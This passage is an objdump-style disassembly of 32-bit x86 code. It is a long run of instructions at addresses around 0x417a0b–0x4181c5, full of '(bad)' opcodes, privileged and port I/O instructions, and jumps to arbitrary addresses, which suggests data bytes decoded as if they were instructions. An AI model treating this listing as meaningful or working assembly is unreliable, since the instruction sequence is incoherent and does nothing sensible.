  417a0b:	and    esi,0x2449f2ac
  417a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a12:	xchg   ch,dl
  417a14:	in     al,dx
  417a15:	gs add al,0x9e
  417a18:	scas   al,BYTE PTR es:[edi]
  417a19:	pushf  
  417a1a:	(bad)  
  417a1b:	jl     0x4179b6
  417a1d:	into   
  417a1e:	sbb    DWORD PTR [esp-0x3f151bf8],eax
  417a25:	dec    edx
  417a26:	mov    bh,0x23
  417a28:	pop    ds
  417a29:	and    BYTE PTR [edx+0x4c0c38a4],ah
  417a2f:	shl    BYTE PTR [esi+0x10f51aee],cl
  417a35:	cmp    BYTE PTR [eax+edx*4+0x51],ch
  417a39:	les    ebx,FWORD PTR [ebx+0x13373371]
  417a3f:	xchg   ebx,eax
  417a40:	test   al,0xa3
  417a42:	lea    esp,[ecx]
  417a44:	mov    ch,0x65
  417a46:	dec    ebx
  417a47:	bound  edx,QWORD PTR ds:0x7d9cc657
  417a4d:	(bad)  
  417a4f:	loopne 0x417a0e
  417a51:	fbld   TBYTE PTR [edi+eax*2]
  417a54:	xor    BYTE PTR [ecx-0x1237410b],al
  417a5a:	add    ch,cl
  417a5c:	(bad)  
  417a5e:	je     0x417a5c
  417a60:	loopne 0x417adc
  417a62:	mov    esp,esi
  417a64:	jmp    0xf41809f5
  417a69:	or     al,BYTE PTR [ecx-0x52]
  417a6c:	pop    eax
  417a6d:	inc    ebp
  417a6e:	mov    esi,0x853486e
  417a73:	leave  
  417a74:	ins    BYTE PTR es:[edi],dx
  417a75:	mov    BYTE PTR [ecx+0x5f],ah
  417a78:	xor    ecx,ebp
  417a7a:	xchg   esi,eax
  417a7b:	data16 (bad) 
  417a7d:	adc    DWORD PTR ds:0xf0cbd35a,esi
  417a83:	mov    ds:0xc522cc90,eax
  417a88:	hlt    
  417a89:	arpl   WORD PTR [ebx+0x4e],bp
  417a8c:	push   eax
  417a8d:	loop   0x417aec
  417a8f:	mov    eax,0x7e32b480
  417a94:	sti    
  417a95:	aaa    
  417a96:	push   edi
  417a97:	enter  0xa176,0x91
  417a9b:	inc    edi
  417a9c:	cdq    
  417a9d:	mov    eax,esi
  417a9f:	lahf   
  417aa0:	dec    ecx
  417aa1:	mov    eax,ds:0x65174d40
  417aa6:	int3   
  417aa7:	sbb    DWORD PTR [eax+0x6e],esi
  417aaa:	mov    esi,0xcdd3bacd
  417aaf:	mov    edx,DWORD PTR [esi+esi*8+0x36b6d4a1]
  417ab6:	jle    0x417ab4
  417ab8:	out    dx,eax
  417ab9:	or     ch,BYTE PTR [ecx]
  417abb:	fsin   
  417abd:	mov    eax,0xbfbfc944
  417ac2:	daa    
  417ac3:	push   eax
  417ac4:	fild   WORD PTR [ebx-0x60987caf]
  417aca:	xlat   BYTE PTR ds:[ebx]
  417acb:	test   BYTE PTR [ebp-0x34d420e1],ah
  417ad1:	jno    0x417b3a
  417ad3:	jns    0x417ab1
  417ad5:	dec    ebp
  417ad6:	addr16 ja 0x1cd6db99
  417add:	sbb    DWORD PTR [ebx+0x10fa1c6c],ebx
  417ae3:	aaa    
  417ae4:	lahf   
  417ae5:	les    ebp,FWORD PTR [ebx]
  417ae7:	clc    
  417ae8:	leave  
  417ae9:	into   
  417aea:	push   eax
  417aeb:	int3   
  417aec:	pop    ds
  417aed:	xchg   ebp,eax
  417aee:	mov    dl,0xc3
  417af0:	aas    
  417af1:	or     ch,BYTE PTR ds:0x91630974
  417af7:	sub    edi,DWORD PTR [ecx+0x781c5593]
  417afd:	les    edx,FWORD PTR [edx]
  417aff:	imul   eax,edx,0xa1f761b0
  417b05:	je     0x417b23
  417b07:	rep lods al,BYTE PTR ss:[esi]
  417b0a:	(bad)  
  417b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b0c:	mov    bh,0xe
  417b0e:	(bad)  
  417b0f:	jae    0x417ad6
  417b11:	daa    
  417b12:	aam    0x18
  417b14:	mov    ecx,0x8cb5edf9
  417b19:	jns    0x417b79
  417b1b:	xor    eax,0xc20a8660
  417b20:	(bad)  
  417b22:	and    DWORD PTR [edx],esi
  417b24:	adc    al,ch
  417b26:	jge    0x417acb
  417b28:	push   ds
  417b29:	adc    ch,0x37
  417b2c:	mov    ecx,DWORD PTR [edi-0x64d16706]
  417b32:	mov    al,ds:0xf4538104
  417b37:	ins    DWORD PTR es:[edi],dx
  417b38:	xchg   ebx,eax
  417b39:	pop    ds
  417b3a:	pop    ebx
  417b3b:	ds xor bl,al
  417b3e:	daa    
  417b3f:	mov    al,ds:0x6446d369
  417b44:	into   
  417b45:	add    eax,0x611998d5
  417b4a:	dec    esi
  417b4b:	fiadd  DWORD PTR [ebp+0x18]
  417b4e:	xchg   ecx,eax
  417b4f:	sbb    eax,0xa979480b
  417b54:	fimul  WORD PTR [edi+edx*1-0x32014bb8]
  417b5b:	jnp    0x417ae2
  417b5d:	xor    DWORD PTR [eax+0x97f491d],ecx
  417b63:	mov    dh,0x9f
  417b65:	cld    
  417b66:	rcr    DWORD PTR [esi*8+0x616dac40],cl
  417b6d:	test   al,0x7c
  417b6f:	cmp    DWORD PTR [edi+0x44749be9],edi
  417b75:	jg     0x417b7c
  417b77:	(bad)  
  417b78:	xlat   BYTE PTR ds:[ebx]
  417b79:	sub    BYTE PTR [esi-0x1e582056],bl
  417b7f:	or     edi,eax
  417b81:	dec    edx
  417b82:	pushf  
  417b83:	repnz sbb al,0x1e
  417b86:	and    ebp,DWORD PTR [ebp-0x9f55d24]
  417b8c:	loope  0x417b34
  417b8e:	xor    bl,BYTE PTR [eax-0x44]
  417b91:	jmp    0x6bb0:0x8356d369
  417b98:	mov    edi,0x26674177
  417b9d:	enter  0x23e1,0x72
  417ba1:	mov    esi,0xcc3a0936
  417ba6:	(bad)  
  417ba7:	adc    al,0xeb
  417ba9:	mov    ah,dh
  417bab:	pop    edi
  417bac:	addr16 lock pusha 
  417baf:	ficomp DWORD PTR [esi-0x2a7a7508]
  417bb5:	sub    BYTE PTR [ebx-0x46b17abb],0xe3
  417bbc:	fs dec ecx
  417bbe:	ret    0xc9f
  417bc1:	std    
  417bc2:	lods   eax,DWORD PTR ds:[esi]
  417bc3:	data16 fcmovu st,st(4)
  417bc6:	cwde   
  417bc7:	std    
  417bc8:	jbe    0x417b83
  417bca:	mov    al,0xef
  417bcc:	xlat   BYTE PTR ds:[ebx]
  417bcd:	xchg   al,bl
  417bcf:	or     BYTE PTR [ebx],ch
  417bd1:	pop    ds
  417bd2:	fcomp  DWORD PTR [esi]
  417bd4:	inc    ebx
  417bd5:	and    dl,BYTE PTR [ecx+esi*2]
  417bd8:	sub    BYTE PTR [ecx-0x32],bl
  417bdb:	sahf   
  417bdc:	in     eax,0x8b
  417bde:	sbb    BYTE PTR [ebx-0x24a00bef],bl
  417be4:	mov    eax,0xdf920c29
  417be9:	mov    esp,0x3f1729e
  417bee:	leave  
  417bef:	mov    DWORD PTR [eax-0x332a07f7],esi
  417bf5:	out    dx,al
  417bf6:	pop    ebx
  417bf7:	adc    ah,0xf1
  417bfa:	inc    ecx
  417bfb:	imul   eax,DWORD PTR [ebp+0x6a],0xffffff92
  417bff:	cmp    BYTE PTR [edx],0x88
  417c02:	xchg   esi,eax
  417c03:	jnp    0x417c7d
  417c05:	add    al,0xde
  417c07:	inc    ecx
  417c08:	xchg   edi,eax
  417c09:	je     0x417b8d
  417c0b:	(bad)  
  417c0c:	push   0x69
  417c0e:	push   eax
  417c0f:	cli    
  417c10:	push   eax
  417c11:	outs   dx,BYTE PTR ds:[esi]
  417c12:	call   0xeddfdb4b
  417c17:	lds    esp,FWORD PTR [eax+ebp*4+0x716d48da]
  417c1e:	sahf   
  417c1f:	or     DWORD PTR [ebx+ebx*1-0x48],0x4
  417c24:	test   bl,dh
  417c26:	add    DWORD PTR [esi+0x22],ebx
  417c29:	(bad)  
  417c2a:	xor    cl,0x1c
  417c2d:	cmp    DWORD PTR [edi],esi
  417c2f:	push   esp
  417c30:	(bad)  
  417c31:	neg    BYTE PTR [esp+edx*1-0x1881cd8b]
  417c38:	test   al,0xba
  417c3a:	sub    eax,0xfef2a772
  417c3f:	sbb    DWORD PTR [edi],edi
  417c41:	daa    
  417c42:	ins    BYTE PTR es:[edi],dx
  417c43:	pop    ebx
  417c44:	repnz lahf 
  417c46:	popf   
  417c47:	(bad)  
  417c48:	icebp  
  417c49:	stos   DWORD PTR es:[edi],eax
  417c4a:	test   DWORD PTR [ecx+0x385cde15],ebp
  417c50:	inc    edi
  417c51:	fistp  WORD PTR [esi+0x5]
  417c54:	gs add eax,0x11431020
  417c5a:	dec    esi
  417c5b:	mov    ?,WORD PTR [eax]
  417c5d:	pop    ss
  417c5e:	popa   
  417c5f:	dec    edi
  417c60:	stos   DWORD PTR es:[edi],eax
  417c61:	xchg   edx,eax
  417c62:	sbb    al,al
  417c64:	dec    ecx
  417c65:	pop    ebp
  417c66:	aas    
  417c67:	push   edx
  417c68:	mov    eax,0x89c309dd
  417c6d:	(bad)  
  417c6e:	outs   dx,BYTE PTR ds:[esi]
  417c6f:	jge    0x417cac
  417c71:	and    DWORD PTR [edx],0xbb7c211b
  417c77:	cmp    BYTE PTR ds:0x32a162a5,ch
  417c7d:	das    
  417c7e:	ss push ebp
  417c80:	xor    dl,BYTE PTR [ebx]
  417c82:	xchg   ecx,eax
  417c83:	int    0x49
  417c85:	mov    fs,esi
  417c87:	sahf   
  417c88:	fs push esp
  417c8a:	cmp    edi,DWORD PTR [ebp-0x64]
  417c8d:	jl     0x417cc7
  417c8f:	fild   QWORD PTR [ecx]
  417c91:	fcmovnbe st,st(7)
  417c93:	or     al,0xdb
  417c95:	or     DWORD PTR [ecx-0x4fa24c31],edi
  417c9b:	sub    bh,BYTE PTR [ebx+0x17]
  417c9e:	lods   al,BYTE PTR ds:[esi]
  417c9f:	jo     0x417c2d
  417ca1:	xchg   DWORD PTR [eax-0x6],esi
  417ca4:	jnp    0x417c55
  417ca6:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  417ca8:	jl     0x417c97
  417caa:	aaa    
  417cab:	xchg   DWORD PTR [ebx+0x3719b6dd],ebx
  417cb1:	jle    0x417ca0
  417cb3:	loop   0x417d20
  417cb5:	jns    0x417c6e
  417cb7:	cld    
  417cb8:	std    
  417cb9:	jge    0x417c57
  417cbb:	call   0x69ec2dff
  417cc0:	ins    DWORD PTR es:[edi],dx
  417cc1:	mov    bl,0x63
  417cc3:	fsin   
  417cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cc6:	sbb    ecx,edx
  417cc8:	add    ecx,edi
  417cca:	fisttp DWORD PTR [ebx-0x38]
  417ccd:	push   es
  417cce:	or     eax,0x1628a279
  417cd3:	or     al,0x9f
  417cd5:	or     cl,ah
  417cd7:	cmp    eax,0x6e40c6ee
  417cdc:	mov    ds:0xb5806d1d,al
  417ce1:	outs   dx,BYTE PTR ds:[esi]
  417ce2:	push   edi
  417ce3:	ds mov esi,0x7e21456b
  417ce9:	inc    eax
  417cea:	retf   0x46c9
  417ced:	jge    0x417c9e
  417cef:	stc    
  417cf0:	mov    dh,bh
  417cf2:	inc    esp
  417cf3:	out    dx,al
  417cf4:	push   0x12
  417cf6:	mov    dl,0x73
  417cf8:	call   0x51269087
  417cfd:	cld    
  417cfe:	scas   eax,DWORD PTR es:[edi]
  417cff:	pop    ebp
  417d00:	dec    ebp
  417d01:	dec    ebp
  417d02:	loop   0x417d52
  417d04:	std    
  417d05:	fbstp  TBYTE PTR [edx-0x2ac095d9]
  417d0b:	add    DWORD PTR [ebp+0x70dbbf6f],esp
  417d11:	sub    cl,cl
  417d13:	int3   
  417d14:	inc    edx
  417d15:	xchg   esp,ebp
  417d17:	aaa    
  417d18:	xchg   ebx,eax
  417d19:	pop    ss
  417d1a:	mov    al,0x31
  417d1c:	dec    edi
  417d1d:	pushf  
  417d1e:	push   edx
  417d1f:	mov    esp,0x628840aa
  417d24:	xor    eax,DWORD PTR [ebx-0x3841f07c]
  417d2a:	inc    edx
  417d2b:	adc    BYTE PTR [esi-0x520fc4e5],dh
  417d31:	or     eax,0xa8c508e6
  417d36:	cwde   
  417d37:	push   eax
  417d38:	dec    edx
  417d39:	push   ecx
  417d3a:	fld    TBYTE PTR [eax]
  417d3c:	sub    DWORD PTR [ebp-0x25],ecx
  417d3f:	out    0xb9,eax
  417d41:	int    0xc7
  417d43:	cli    
  417d44:	or     esi,DWORD PTR [edi]
  417d46:	mov    cl,0x13
  417d48:	xor    BYTE PTR [eax-0x368b447d],ah
  417d4e:	pusha  
  417d4f:	xor    eax,0xcd3add63
  417d54:	inc    eax
  417d55:	mov    ebp,0x34e73de8
  417d5a:	dec    eax
  417d5b:	jp     0x417d6e
  417d5d:	mov    ecx,0x30a54be5
  417d62:	lock movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  417d65:	pop    ds
  417d66:	rol    BYTE PTR [ecx],0xd
  417d69:	mov    ds:0x28b1d85e,eax
  417d6e:	jge    0x417d9a
  417d70:	retf   0x41e0
  417d73:	mov    bh,0xa3
  417d75:	stos   DWORD PTR es:[edi],eax
  417d76:	fs scas eax,DWORD PTR es:[edi]
  417d78:	out    0xbf,al
  417d7a:	mov    WORD PTR [edx],fs
  417d7c:	cmp    DWORD PTR [edi+0x8],edi
  417d7f:	mov    bh,0xb7
  417d81:	(bad)  
  417d82:	(bad)  
  417d83:	sub    eax,0x8fc53252
  417d88:	adc    DWORD PTR [edx-0xd3b6526],edx
  417d8e:	mov    esp,0x748fffc4
  417d93:	pop    ebx
  417d94:	mov    bh,0x7a
  417d96:	or     eax,0xe1357e75
  417d9b:	push   ecx
  417d9c:	jmp    0xc848866e
  417da1:	dec    esp
  417da2:	dec    ebp
  417da3:	add    DWORD PTR [edx+0x37ed7051],edx
  417da9:	test   BYTE PTR [ebp-0x7f],ch
  417dac:	pop    esi
  417dad:	imul   edi,DWORD PTR [edx+0x56],0x94768087
  417db4:	arpl   WORD PTR [edx-0x6000edcf],di
  417dba:	xor    DWORD PTR [eax+0x47],esp
  417dbd:	sub    al,0xe9
  417dbf:	sub    cl,BYTE PTR [edi]
  417dc1:	xor    al,0x7c
  417dc3:	imul   esp,DWORD PTR [eax-0x564fa3e1],0xec4c0bf9
  417dcd:	sbb    al,0x1e
  417dcf:	mov    bl,0x10
  417dd1:	push   eax
  417dd2:	jbe    0x417db3
  417dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dd5:	ins    DWORD PTR es:[edi],dx
  417dd6:	mov    gs,WORD PTR [edi+0x27]
  417dd9:	and    DWORD PTR [ecx],esi
  417ddb:	xor    DWORD PTR [edx],ecx
  417ddd:	scas   al,BYTE PTR es:[edi]
  417dde:	loopne 0x417df1
  417de0:	push   ss
  417de1:	push   edx
  417de2:	popa   
  417de3:	or     al,0x88
  417de5:	adc    al,0x49
  417de7:	out    0xf4,ax
  417dea:	call   0x6a00:0xbfe3e50
  417df1:	mov    al,ds:0xb50ab440
  417df6:	pop    edi
  417df7:	jno    0x417dd6
  417df9:	mov    es:0x349c3427,eax
  417dff:	inc    ebp
  417e00:	std    
  417e01:	inc    eax
  417e02:	mov    bl,0xcb
  417e04:	fstp   TBYTE PTR [edi+0x77a201f0]
  417e0a:	push   cs
  417e0b:	sub    edi,esp
  417e0d:	xor    ebx,DWORD PTR [edi-0x24ea3fb4]
  417e13:	jnp    0x417dda
  417e15:	aaa    
  417e16:	outs   dx,DWORD PTR ds:[esi]
  417e17:	(bad)  
  417e18:	pop    es
  417e19:	add    DWORD PTR [ebp-0x6419b792],ebx
  417e1f:	push   edx
  417e20:	ret    0x12fa
  417e23:	push   edi
  417e24:	mov    bl,0xf2
  417e26:	cwde   
  417e27:	fisttp QWORD PTR [edx]
  417e29:	add    eax,0xa588cfb1
  417e2e:	pop    esi
  417e2f:	ins    DWORD PTR es:[edi],dx
  417e30:	mov    esp,DWORD PTR [edx+0x73]
  417e33:	or     eax,esp
  417e35:	cmc    
  417e36:	inc    ecx
  417e37:	xchg   ecx,eax
  417e38:	stc    
  417e39:	pop    es
  417e3a:	add    eax,0x9bcfab4c
  417e3f:	sbb    eax,0x50523f25
  417e44:	jne    0x417e83
  417e46:	mov    dh,0x53
  417e48:	retf   
  417e49:	jle    0x417ec3
  417e4b:	mov    edx,0xe7378c5f
  417e50:	dec    edx
  417e51:	mov    al,ds:0xef1750ef
  417e56:	icebp  
  417e57:	aas    
  417e58:	ins    DWORD PTR es:[edi],dx
  417e59:	lock cmp al,0xdc
  417e5c:	out    dx,eax
  417e5d:	sbb    al,0x7
  417e5f:	(bad)  
  417e61:	ret    0x23f6
  417e64:	xchg   BYTE PTR [ebx-0x67],bh
  417e67:	jno    0x417e12
  417e69:	sub    ecx,0xffffffde
  417e6c:	retf   0xefe7
  417e6f:	mov    bh,0x30
  417e71:	call   0xdf8261b6
  417e76:	cmp    eax,0x9d471ec3
  417e7b:	scas   al,BYTE PTR es:[edi]
  417e7c:	ins    BYTE PTR es:[edi],dx
  417e7d:	push   ebp
  417e7e:	mov    ebx,0x49b19eca
  417e83:	retf   
  417e84:	xchg   edi,eax
  417e85:	add    eax,DWORD PTR [eax]
  417e87:	inc    edx
  417e88:	jne    0x417e10
  417e8a:	fcom   DWORD PTR ds:0xb98b433
  417e90:	sbb    eax,0xa56e99a4
  417e95:	mov    esi,0xc27c71f4
  417e9a:	dec    esp
  417e9b:	rcr    BYTE PTR [edi],0xc1
  417e9e:	mov    cl,0x51
  417ea0:	repnz inc esp
  417ea2:	and    dh,BYTE PTR [esi]
  417ea4:	xchg   esp,eax
  417ea5:	addr16 jns 0x417e8f
  417ea8:	adc    eax,0x33a3a0ee
  417ead:	lea    ebx,ds:0xbdfeccad
  417eb3:	adc    esi,edx
  417eb5:	test   BYTE PTR [esi-0x5b],dh
  417eb8:	popa   
  417eb9:	inc    edi
  417eba:	xor    ah,BYTE PTR [edx-0x34]
  417ebd:	popf   
  417ebe:	cli    
  417ebf:	cmp    al,0x70
  417ec2:	ja     0x417ea1
  417ec4:	test   DWORD PTR [eax+0x6a885801],ebp
  417eca:	clc    
  417ecb:	cmp    dl,BYTE PTR [ebx+0x2b9cdfde]
  417ed1:	dec    eax
  417ed2:	mov    edx,0x4326c9e8
  417ed7:	dec    esp
  417ed8:	jb     0x417e98
  417eda:	mov    bh,0x7e
  417edc:	cld    
  417edd:	inc    esp
  417ede:	clc    
  417edf:	fwait
  417ee0:	shl    BYTE PTR [ebp-0x43ea0a15],0x11
  417ee7:	leave  
  417ee8:	retf   0x685a
  417eeb:	mov    al,0xfc
  417eed:	call   0x15922542
  417ef2:	and    eax,0x54e96231
  417ef7:	cmc    
  417ef8:	add    cl,BYTE PTR [ebp+0x1]
  417efb:	fld    DWORD PTR [ebp+eax*4+0x6d1a78ac]
  417f02:	test   DWORD PTR [edi+0x19d27d8e],esi
  417f08:	das    
  417f09:	aas    
  417f0a:	cmp    al,0x8c
  417f0c:	jmp    0xd829eecb
  417f11:	repz mov ebx,0x4637a3cf
  417f17:	lahf   
  417f18:	dec    edx
  417f19:	and    dh,dh
  417f1b:	xor    eax,0xfa7a233c
  417f20:	ret    0x15db
  417f23:	or     eax,0x5b382f7a
  417f28:	pop    ds
  417f29:	mov    ecx,0xa7a4a94c
  417f2e:	jne    0x417ed5
  417f30:	xor    BYTE PTR [edx+0x5fe7754],dh
  417f36:	inc    edx
  417f37:	jmp    0xa20f7280
  417f3c:	nop
  417f3d:	cwde   
  417f3e:	dec    edi
  417f3f:	push   cs
  417f40:	mov    DWORD PTR [edx-0x3f],ebp
  417f43:	popa   
  417f44:	pop    ecx
  417f45:	jecxz  0x417f2b
  417f47:	popa   
  417f48:	inc    ebp
  417f49:	mov    ds:0x244809dc,al
  417f4e:	add    ebp,ebp
  417f50:	mov    dh,0x34
  417f52:	or     al,0x12
  417f54:	lods   al,BYTE PTR ds:[esi]
  417f55:	mov    edx,esp
  417f57:	xchg   esi,eax
  417f58:	aaa    
  417f59:	or     al,0xfa
  417f5b:	jne    0x417fb0
  417f5d:	adc    dh,BYTE PTR [ebx+ebx*4-0x2c]
  417f61:	sub    DWORD PTR [ebp+ebx*8-0x9a42736],edx
  417f68:	clc    
  417f69:	test   al,ch
  417f6b:	scas   al,BYTE PTR es:[edi]
  417f6c:	adc    eax,0x9fabca16
  417f71:	jnp    0x417f6c
  417f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f74:	(bad)  
  417f75:	outs   dx,BYTE PTR ds:[esi]
  417f76:	adc    BYTE PTR [edi+0x75],0x58
  417f7a:	addr16 call 0xd1e9:0x6ba14a3b
  417f82:	(bad)  
  417f84:	xor    ecx,ebx
  417f86:	ret    0x43df
  417f89:	sub    al,0xe3
  417f8b:	loop   0x417f7b
  417f8d:	scas   al,BYTE PTR es:[edi]
  417f8e:	fdiv   QWORD PTR [eax]
  417f90:	jae    0x417fec
  417f92:	inc    esi
  417f93:	hlt    
  417f94:	inc    esi
  417f95:	aaa    
  417f96:	aam    0x15
  417f98:	or     al,0x52
  417f9a:	retf   0x2a44
  417f9d:	out    0xe1,al
  417f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fa0:	push   cs
  417fa1:	xor    dh,BYTE PTR [edx]
  417fa3:	in     al,0x58
  417fa5:	mov    DWORD PTR [ecx-0xf],esi
  417fa8:	mov    ecx,0x8791ecb3
  417fad:	mov    WORD PTR [ebx+0x3a],?
  417fb0:	das    
  417fb1:	int3   
  417fb2:	pop    esp
  417fb3:	xchg   cl,cl
  417fb5:	jg     0x418006
  417fb7:	push   edx
  417fb8:	mov    edi,0xb74fac4a
  417fbd:	out    0xb1,al
  417fbf:	fisttp DWORD PTR [eax+0xf]
  417fc2:	xchg   ecx,eax
  417fc3:	sub    eax,0x1d907df2
  417fc8:	adc    al,0x1b
  417fca:	dec    BYTE PTR [eax-0x6e135275]
  417fd0:	xchg   BYTE PTR [ebx+ebx*4],cl
  417fd3:	sahf   
  417fd4:	paddd  mm7,mm7
  417fd7:	nop
  417fd8:	and    eax,0x7b42e18c
  417fdd:	cmp    BYTE PTR [ebp+ebp*8+0x7d],bh
  417fe1:	ror    dl,cl
  417fe3:	and    eax,esp
  417fe5:	or     al,BYTE PTR [ebx]
  417fe7:	scas   eax,DWORD PTR es:[edi]
  417fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fe9:	sar    BYTE PTR [esi+0x7],0xd4
  417fed:	mov    eax,0x49b68315
  417ff2:	sbb    BYTE PTR [ecx+0xe64865],al
  417ff8:	sbb    al,0x4
  417ffa:	test   BYTE PTR [edi+0x5c2498bc],ah
  418000:	mov    ah,BYTE PTR [ecx]
  418002:	cmp    ch,dh
  418004:	mov    WORD PTR [edi-0x19],cs
  418007:	mov    ?,WORD PTR [ecx-0x3]
  41800a:	into   
  41800b:	xchg   ebx,eax
  41800c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41800d:	jge    0x417fbd
  41800f:	cmp    al,0xe
  418011:	mov    ebp,0x6badaa9f
  418016:	push   ebp
  418017:	mov    dh,0x9c
  418019:	sbb    DWORD PTR [eax-0x38],esp
  41801c:	sbb    BYTE PTR [ebx],ah
  41801e:	or     BYTE PTR [esi+0x16f6769d],bh
  418024:	mov    esp,0x85477bd4
  418029:	mov    esi,0x6cf5ecb2
  41802e:	fs dec eax
  418030:	outs   dx,BYTE PTR ds:[esi]
  418031:	push   edi
  418032:	xor    BYTE PTR [ebx],bl
  418034:	ret    0x2c7c
  418037:	(bad)  
  418038:	mul    BYTE PTR [esi+0x3200ffcd]
  41803e:	sub    esi,ebp
  418040:	xchg   edi,eax
  418041:	dec    ebp
  418042:	dec    ebp
  418043:	inc    eax
  418044:	adc    eax,0x107dd6c3
  418049:	mov    eax,0x1ab32571
  41804e:	mov    ds:0xc8d9953a,al
  418053:	mov    ebx,0xea032c8f
  418058:	leave  
  418059:	mov    dl,0x7d
  41805b:	inc    edx
  41805c:	call   0xb2695e8f
  418061:	and    dl,al
  418063:	(bad)  
  418064:	sub    DWORD PTR [esi-0x3d36e3b2],eax
  41806a:	ins    BYTE PTR es:[edi],dx
  41806b:	inc    esi
  41806c:	in     eax,0x62
  41806e:	and    BYTE PTR [esi-0x12],0xed
  418072:	xchg   esi,eax
  418073:	mov    ds:0x49879a26,al
  418078:	pop    esp
  418079:	stc    
  41807a:	mov    ds:0xf1eeb0ab,al
  41807f:	push   edx
  418080:	pop    edx
  418081:	clc    
  418082:	mov    ds:0xfa94017e,al
  418087:	jno    0x4180fc
  418089:	aam    0xfb
  41808b:	dec    esp
  41808c:	jmp    0x4180c0
  41808e:	push   0xffffffb7
  418090:	inc    ecx
  418091:	shl    eax,0xf0
  418094:	(bad)  
  418096:	cmovnp esi,DWORD PTR [ecx+0x62dac98f]
  41809d:	ins    DWORD PTR es:[edi],dx
  41809e:	pop    ecx
  41809f:	ins    BYTE PTR es:[edi],dx
  4180a0:	add    eax,0xb5cdb69f
  4180a5:	pushf  
  4180a6:	xchg   DWORD PTR [ebp+0x28],ebx
  4180a9:	mov    dl,0xa9
  4180ab:	sbb    ebx,DWORD PTR [eax+0x7e]
  4180ae:	mov    dh,0x43
  4180b0:	mov    al,0xa9
  4180b2:	pop    esp
  4180b3:	leave  
  4180b4:	push   cs
  4180b5:	or     esi,esp
  4180b7:	push   ecx
  4180b8:	xor    BYTE PTR [ebp-0x32],0xdb
  4180bc:	jl     0x4180d2
  4180be:	mov    eax,0x88726a74
  4180c3:	xchg   ebp,eax
  4180c4:	mov    eax,0xce22c0a0
  4180c9:	mov    ah,0x30
  4180cb:	mov    DWORD PTR [ebx+ebx*2-0x36],eax
  4180cf:	repz xchg edi,eax
  4180d1:	mov    ah,0x51
  4180d3:	ins    DWORD PTR es:[edi],dx
  4180d4:	push   ebx
  4180d5:	into   
  4180d6:	pop    esp
  4180d7:	adc    DWORD PTR [esi+0x68],0x188a0ad
  4180de:	add    al,0xb2
  4180e0:	aas    
  4180e1:	scas   eax,DWORD PTR es:[edi]
  4180e2:	sbb    DWORD PTR [edx],edi
  4180e4:	hlt    
  4180e5:	mov    dl,0xf0
  4180e7:	nop
  4180e8:	lahf   
  4180e9:	popf   
  4180ea:	aas    
  4180eb:	shr    bh,0xef
  4180ee:	xchg   BYTE PTR [edx],ch
  4180f0:	fisub  WORD PTR [edi-0x302c604]
  4180f6:	and    esp,DWORD PTR [edi]
  4180f8:	push   ebp
  4180f9:	pushf  
  4180fa:	mov    BYTE PTR fs:[eax],ch
  4180fd:	xchg   ebx,eax
  4180fe:	xlat   BYTE PTR ds:[ebx]
  418100:	push   eax
  418101:	xor    ebx,DWORD PTR [edi-0x3e]
  418104:	les    esp,FWORD PTR [esp+ebp*1]
  418107:	faddp  st(4),st
  418109:	fist   WORD PTR [ecx]
  41810b:	mov    bl,0x8d
  41810d:	in     eax,0xec
  41810f:	daa    
  418110:	xchg   esi,eax
  418111:	aaa    
  418112:	jnp    0x418179
  418114:	lds    ebx,FWORD PTR [edx]
  418116:	or     bl,BYTE PTR [eax-0x3a]
  418119:	rcl    BYTE PTR [ecx-0x63ef9e84],1
  41811f:	mov    eax,0x36ec5b9d
  418124:	sahf   
  418125:	lock sub al,BYTE PTR [ebx]
  418128:	add    BYTE PTR [eax],bl
  41812a:	sysret 
  41812c:	mov    DWORD PTR cs:[edi-0x58],eax
  418130:	inc    edi
  418131:	cmp    al,0xcc
  418133:	pop    edx
  418134:	sub    DWORD PTR [eax-0x13],edx
  418137:	inc    eax
  418138:	and    bl,ah
  41813a:	psubq  mm5,mm1
  41813d:	inc    esp
  41813e:	xor    DWORD PTR [ecx-0x2eecb5cb],eax
  418144:	js     0x41813b
  418146:	inc    esp
  418147:	shr    DWORD PTR [edx],cl
  418149:	cmp    al,ch
  41814b:	(bad)
  41814e:	inc    esp
  41814f:	sub    BYTE PTR [ecx-0x2bc08993],bl
  418155:	and    DWORD PTR [ebx],ecx
  418157:	sub    DWORD PTR [eax+0x77],esp
  41815a:	scas   al,BYTE PTR es:[edi]
  41815b:	fnstsw WORD PTR [esi]
  41815d:	mov    eax,0xa8d4865c
  418162:	scas   eax,DWORD PTR es:[edi]
  418163:	xchg   esp,eax
  418164:	nop
  418165:	add    BYTE PTR [esi-0x47880ba8],bl
  41816b:	loope  0x41810b
  41816d:	mov    WORD PTR [eax*1+0x6f3e2a57],es
  418174:	and    al,0xd4
  418176:	add    DWORD PTR [ebp-0x1fceacc6],ebx
  41817c:	ror    esi,1
  41817e:	cmpps  xmm6,XMMWORD PTR [edi+0x63],0xc7
  418183:	sub    eax,0x3853668c
  418188:	hlt    
  418189:	or     bl,BYTE PTR [ebx+0x62]
  41818c:	dec    eax
  41818d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41818f:	adc    ah,BYTE PTR [esi-0x22]
  418192:	dec    ecx
  418193:	pop    ds
  418194:	loopne 0x4181ae
  418196:	retf   0x4c85
  418199:	adc    eax,eax
  41819b:	xor    BYTE PTR [edx],0x59
  41819e:	je     0x418133
  4181a0:	stc    
  4181a1:	pop    es
  4181a2:	mov    ds:0x447d7b5f,eax
  4181a7:	lea    ebp,[ebx+edi*1]
  4181aa:	nop
  4181ab:	and    BYTE PTR [eax+eax*1],al
  4181ae:	xchg   BYTE PTR [ecx+0x2a],ch
  4181b1:	mov    ?,ebx
  4181b3:	ficomp DWORD PTR [ebx+0x55]
  4181b6:	inc    edx
  4181b7:	imul   ecx,DWORD PTR [ebx+0x56795da3],0xbf2e6376
  4181c1:	ficom  DWORD PTR [edi-0x67]
  4181c4:	scas   al,BYTE PTR es:[edi]
  4181c5:	call   0x4521:0x9fe46f78
